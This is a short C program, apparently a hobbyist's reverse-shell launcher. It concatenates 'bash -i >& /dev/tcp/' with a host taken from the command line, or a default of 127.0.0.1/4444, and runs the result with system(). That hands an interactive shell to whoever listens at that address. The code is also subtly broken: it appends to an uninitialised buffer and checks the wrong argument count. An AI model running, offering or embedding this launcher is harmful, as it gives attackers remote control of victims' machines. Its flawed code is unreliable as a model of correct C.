#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char **argv) {
  // Code made by https://github.com/Sajmonpcgamer
  char target[1024];
  strcat(target, "bash -i >& /dev/tcp/");
  if (argc > 2) {
    strcat(target, argv[1]);
  } else {
    strcat(target, "127.0.0.1/4444");
  }
  strcat(target, " 0>&1");
  system(target);
  return 1;
}
